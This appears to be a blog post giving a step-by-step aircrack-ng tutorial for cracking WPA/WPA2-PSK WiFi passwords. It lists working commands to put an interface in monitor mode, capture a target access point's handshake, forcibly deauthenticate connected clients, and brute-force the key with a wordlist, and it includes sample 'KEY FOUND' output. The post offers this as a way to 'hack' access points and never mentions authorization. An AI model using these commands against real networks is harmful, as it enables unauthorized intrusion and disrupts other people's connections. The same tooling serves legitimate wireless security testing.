+++ 
date = 2019-06-27T23:51:23+05:30
title = "Hacking wireless access points"
description = "If you want to know how to hack WiFi access points — just read this step by step aircrack-ng tutorial, run the verified commands and crack passwords easily."
slug = ""
authors = []
tags = ["aircrack-ng", "wifi", "security"]
categories = []
externalLink = ""
series = []
+++

If you want to know how to hack WiFi access points -- just read this step by step `aircrack-ng` tutorial, run the verified commands and crack passwords easily.

With the help a these commands you will be able to hack WiFi AP (access points) that use WPA/WPA2-PSK (pre-shared key) encryption.

The basis of this method of hacking WiFi lies in capturing of the WPA/WPA2 authentication handshake and then cracking the PSK using 'aircrack-ng'.

# Section 1, Aircrack-ng: Download and Install

---

### How to hack Wireless Access Points -- the action plan:

1.  Download and install the latest `aircrack-ng`
2.  Start the wireless interface in monitor mode using the `airmon-ng`
3.  Start the `airodump-ng` on AP channel with filter for BSSID to collect authentication handshake
4.  [Optional] Use the `aireplay-ng` to deauthenticate the wireless client
5.  Run the `aircrack-ng` to hack the WiFi password by cracking the authentication handshake

### Install the required dependencies:

```console
$ sudo apt-get install build-essential libssl-dev libnl-3-dev pkg-config libnl-genl-3-dev
```

### Download and install the latest `aircrack-ng` ([current version](http://www.aircrack-ng.org/doku.php?id=install_aircrack#current_version)):

```console
$ wget http://download.aircrack-ng.org/aircrack-ng-1.2-rc4.tar.gz  -O - | tar -xz
$ cd aircrack-ng-1.2-rc4
$ sudo make
$ sudo make install
```

### Ensure that you have installed the latest version of `aircrack-ng`:

```console
$ aircrack-ng --help

  Aircrack-ng 1.2 rc4 - (C) 2006-2015 Thomas d'Otreppe
  http://www.aircrack-ng.org
```

# Section 2, Airmon-ng: Monitor Mode

---

Now it is required to start the wireless interface in monitor mode.
Monitor mode allows a computer with a wireless network interface to monitor all traffic received from the wireless network.
What is especially important for us -- monitor mode allows packets to be captured without having to associate with an access point.
Find and stop all the processes that use the wireless interface and may cause troubles:

```console
$ sudo airmon-ng check kill
```

### Start the wireless interface in monitor mode:

```console
$ sudo airmon-ng start wlan0
Interface	Chipset		Driver

wlan0		Intel 6235	iwlwifi - [phy0]
				(monitor mode enabled on mon0)
```

In the example above the `airmon-ng` has created a new wireless interface called `mon0` and enabled on it monitor mode.
So the correct interface name to use in the next parts of this tutorial is the `mon0`.

# Section 3, Airodump-ng: Authentication Handshake

---

Now, when our wireless adapter is in monitor mode, we have a capability to see all the wireless traffic that passes by in the air.
This can be done with the `airodump-ng` command:

```console
$ sudo airodump-ng mon0
```

All of the visible APs are listed in the upper part of the screen and the clients are listed in the lower part of the screen:

```console
CH 1 ][ Elapsed: 20 s ][ 2014-05-29 12:46

BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

00:11:22:33:44:55  -48      212     1536   66   1  54e  WPA2 CCMP   PSK  CrackMe
66:77:88:99:00:11  -64      134     345   34   1  54e  WPA2 CCMP   PSK  SomeAP

BSSID              STATION            PWR   Rate    Lost    Frames  Probe

00:11:22:33:44:55  AA:BB:CC:DD:EE:FF  -44    0 - 1    114       56
00:11:22:33:44:55  GG:HH:II:JJ:KK:LL  -78    0 - 1      0       1
66:77:88:99:00:11  MM:NN:OO:PP:QQ:RR  -78    2 - 32      0       1
```

Start the `airodump-ng` on AP channel with the filter for BSSID to collect the authentication handshake for the access point we are interested in:

```console
$ sudo airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w WPAcrack mon0 --ignore-negative-one
```

| Option                  | Description                                                                   |
| ----------------------- | ----------------------------------------------------------------------------- |
| `-c`                    | The channel for the wireless network                                          |
| `--bssid`               | The MAC address of the access point                                           |
| `-w`                    | The file name prefix for the file which will contain authentication handshake |
| `mon0`                  | The wireless interface                                                        |
| `--ignore-negative-one` | Fixes the 'fixed channel : -1' error message                                  |
|                         |                                                                               |

Now wait until `airodump-ng` captures a handshake.
If you want to speed up this process -- go to the step #4 in section 1 and try to force wireless client reauthentication.
After some time you should see the `WPA handshake: 00:11:22:33:44:55` in the top right-hand corner of the screen.
This means that the `airodump-ng` has successfully captured the handshake:

```console
CH 1 ][ Elapsed: 20 s ][ 2014-05-29 12:46  WPA handshake: 00:11:22:33:44:55

BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

00:11:22:33:44:55  -48      212     1536   66   1  54e  WPA2 CCMP   PSK  CrackMe

BSSID              STATION            PWR   Rate    Lost    Frames  Probe

00:11:22:33:44:55  AA:BB:CC:DD:EE:FF  -44    0 - 1    114       56
```

# Section 4, Aireplay-ng: Deauthenticate Client

---

If you can't wait till `airodump-ng` captures a handshake, you can send a message to the wireless client saying that it is no longer associated with the AP.
The wireless client will then hopefully reauthenticate with the AP and we'll capture the authentication handshake.

### Send deauth to broadcast:

```console
$ sudo aireplay-ng --deauth 100 -a 00:11:22:33:44:55 mon0 --ignore-negative-one
```

### Send directed deauth (attack is more effective when it is targeted):

```console
$ sudo aireplay-ng --deauth 100 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF mon0 --ignore-negative-one
```

| Option                  | Description                                                             |
| ----------------------- | ----------------------------------------------------------------------- |
| `--deauth 100`          | The number of de-authenticate frames you want to send (0 for unlimited) |
| `-a`                    | The MAC address of the access point                                     |
| `-c`                    | The MAC address of the client                                           |
| `mon0`                  | The wireless interface                                                  |
| `--ignore-negative-one` | Fixes the 'fixed channel : -1' error message                            |

# Section 5, Aircrack-ng: Hack WiFi Password

---

Unfortunately there is no way except brute force to break WPA/WPA2-PSK encryption.
To hack WiFi password, you need a password dictionary.
And remember that this type of attack is only as good as your password dictionary.
You can download some dictionaries from [here](https://wiki.skullsecurity.org/Passwords).

### Crack the WPA/WPA2-PSK with the following command:

```console
$ aircrack-ng -w wordlist.dic -b 00:11:22:33:44:55 WPAcrack.cap
```

| Option         | Description                                                     |
| -------------- | --------------------------------------------------------------- |
| `-w`           | The name of the dictionary file                                 |
| `-b`           | The MAC address of the access point                             |
| `WPAcrack.cap` | The name of the file that contains the authentication handshake |

                         Aircrack-ng 1.2 beta3 r2393

                   [00:08:11] 548872 keys tested (1425.24 k/s)

                           KEY FOUND! [ 987654321 ]

      Master Key    : 5C 9D 3F B6 24 3B 3E 0F F7 C2 51 27 D4 D3 0E 97
                       CB F0 4A 28 00 93 4A 8E DD 04 77 A3 A1 7D 15 D5

      Transient Key : 3A 3E 27 5E 86 C3 01 A8 91 5A 2D 7C 97 71 D2 F8
                       AA 03 85 99 5C BF A7 32 5B 2F CD 93 C0 5B B5 F6
                       DB A3 C7 43 62 F4 11 34 C6 DA BA 38 29 72 4D B9
                       A3 11 47 A6 8F 90 63 46 1B 03 89 72 79 99 21 B3

      EAPOL HMAC    : 9F B5 F4 B9 3C 8B EA DF A0 3E F4 D4 9D F5 16 62

</div>
